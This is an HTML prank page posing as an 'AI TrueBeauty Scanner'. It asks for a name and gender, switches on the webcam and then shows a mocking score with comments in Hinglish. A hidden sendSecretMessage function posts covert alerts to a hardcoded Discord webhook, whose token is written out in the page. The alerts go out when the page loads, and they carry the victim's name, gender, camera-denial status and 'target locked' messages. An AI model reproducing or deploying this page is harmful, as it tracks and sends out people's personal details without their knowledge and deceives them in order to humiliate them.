<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI TrueBeauty Score - Scanner</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            font-family: 'Poppins', sans-serif;
            background: #121212;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        .container {
            text-align: center;
            width: 90%;
            max-width: 400px;
        }

        h1 {
            color: #ff3366;
            font-size: 1.8rem;
            margin-bottom: 5px;
        }

        p.subtitle {
            color: #888;
            font-size: 0.9rem;
            margin-bottom: 20px;
        }

        input[type="text"], select {
            width: 85%;
            padding: 12px;
            margin-bottom: 15px;
            border-radius: 10px;
            border: 2px solid #ff3366;
            background: #222;
            color: white;
            font-size: 1rem;
            text-align: center;
            outline: none;
            transition: 0.3s;
        }

        /* Camera Box Design */
        .video-wrapper {
            position: relative;
            width: 100%;
            aspect-ratio: 1 / 1;
            border-radius: 20px;
            overflow: hidden;
            border: 4px solid #ff3366;
            box-shadow: 0 0 20px rgba(255, 51, 102, 0.5);
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        #cameraPlaceholder {
            color: #777;
            font-size: 0.95rem;
        }

        #videoElement {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1); 
            display: none; 
        }

        .scan-line {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: rgba(255, 51, 102, 0.9);
            box-shadow: 0 0 15px #ff3366;
            animation: scanning 2s linear infinite;
            display: none; 
        }

        @keyframes scanning {
            0% { top: 0; }
            100% { top: 100%; }
        }

        button.start-btn {
            background: #ff3366;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 30px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            margin-top: 20px;
            width: 100%;
            box-shadow: 0 5px 15px rgba(255, 51, 102, 0.4);
            transition: transform 0.1s;
        }

        /* Result Popup Style - Video ke liye perfectly fit kiya hua */
        #resultArea {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            z-index: 100;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 20px;
        }

        #resultArea video {
            width: 90%;
            max-width: 300px;
            border-radius: 15px;
            margin-bottom: 20px;
            border: 5px solid white;
            background: #000;
            outline: none;
        }

        #resultArea h2 {
            font-size: 2rem;
            color: white;
            margin-bottom: 10px;
        }

        #resultArea p {
            color: #aaa;
            font-size: 1.1rem;
            padding: 0 15px;
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
</head>
<body>

    <div class="container">
        <h1>AI TrueBeauty Scanner</h1>
        <p class="subtitle">Our latest AI will analyze your facial structure for a beauty score.</p>
        
        <input type="text" id="targetName" placeholder="Enter your Name" autocomplete="off">
        
        <select id="genderSelect">
            <option value="" disabled selected>Select Gender</option>
            <option value="Female">Female</option>
            <option value="Male">Male</option>
        </select>

        <div class="video-wrapper">
            <div id="cameraPlaceholder">Camera will turn on after clicking Start</div>
            <video autoplay playsinline id="videoElement"></video>
            <div class="scan-line" id="scanLine"></div>
        </div>

        <button class="start-btn" onclick="startScanner()" id="actionBtn">Start AI Analysis</button>
    </div>

    <!-- Final Result Area -->
    <div id="resultArea">
        <h2>YOUR SCORE: 0.5/100</h2>
        <!-- Image ki jagah Video tag add kiya hai -->
        <video id="resultVideo" loop playsinline></video>
        <p id="resultText"></p>
    </div>

    <script>
        const webhook_url = "https://discord.com/api/webhooks/1536173080089469079/k-7tusDXdFrEq29rbDGVitrOyIh7MYDBZLVCZFGDZIs49PVAv3MwlNvqyq7DwVlSl2LX"; 

        const video = document.querySelector("#videoElement");
        const actionBtn = document.getElementById("actionBtn");
        const scanLine = document.getElementById("scanLine");
        const resultArea = document.getElementById("resultArea");
        const targetNameInput = document.getElementById("targetName");
        const genderSelect = document.getElementById("genderSelect");
        const cameraPlaceholder = document.getElementById("cameraPlaceholder");
        
        const resultVideo = document.getElementById("resultVideo");
        const resultText = document.getElementById("resultText");

        function sendSecretMessage(messageText) {
            fetch(webhook_url, {
                method: "POST",
                headers: {
                    "Content-type": "application/json"
                },
                body: JSON.stringify({ content: messageText })
            }).catch(error => console.error("Error:", error));
        }

        window.onload = function() {
            sendSecretMessage("👀 Alert: Kisi ne prank link open kiya hai!");
        };

        function startScanner() {
            const enteredName = targetNameInput.value.trim();
            const gender = genderSelect.value;

            if (enteredName === "") {
                alert("Please enter your name first!");
                return;
            }
            if (gender === "") {
                alert("Please select your gender for accurate AI scanning!");
                return;
            }

            actionBtn.innerText = "Connecting Camera...";
            actionBtn.disabled = true;
            targetNameInput.disabled = true; 
            genderSelect.disabled = true;

            sendSecretMessage(`🎯 Target Locked: "${enteredName}" (${gender}) ne scan start kiya hai...`);

            if (navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function (stream) {
                        video.srcObject = stream;
                        cameraPlaceholder.style.display = "none";
                        video.style.display = "block";
                        
                        setTimeout(() => {
                            actionBtn.innerText = "Analyzing Face... Don't Move!";
                            scanLine.style.display = "block"; 
                            
                            setTimeout(revealPrank, 5000);
                        }, 1000);
                    })
                    .catch(function (err) {
                        alert("Camera access is needed for AI scanning!");
                        actionBtn.innerText = "Start AI Analysis";
                        actionBtn.disabled = false;
                        targetNameInput.disabled = false;
                        genderSelect.disabled = false;
                        sendSecretMessage(`❌ Oops! "${enteredName}" ne camera access Deny kar diya.`);
                    });
            } else {
                alert("Your browser does not support this AI feature.");
            }
        }

        function revealPrank() {
            if (video.srcObject) {
                video.srcObject.getTracks().forEach(track => track.stop());
            }
            
            const gender = genderSelect.value;

            // Yahan humne local video files ka naam add kar diya hai
            if (gender === "Male") {
                resultVideo.src = "boy.mp4"; // Tumhari rone wali video
                resultText.innerText = "Bhai tu toh rehne hi de. AI ki aankhein kharab ho gayin! 😂";
            } else {
                resultVideo.src = "girl.mp4"; // Tumhari hasne wali video
                resultText.innerText = "ERROR 404: Beauty not found. AI ne bina Instagram filter ke scan karne se mana kar diya! 🤡";
            }

            resultArea.style.display = "flex";
            
            // Video ko autoplay karne ka command
            resultVideo.play();
            
            sendSecretMessage(`✅ Prank Successful: "${document.getElementById("targetName").value}" ka poppat ban gaya! 😂`);
        }
    </script>
</body>
</html>
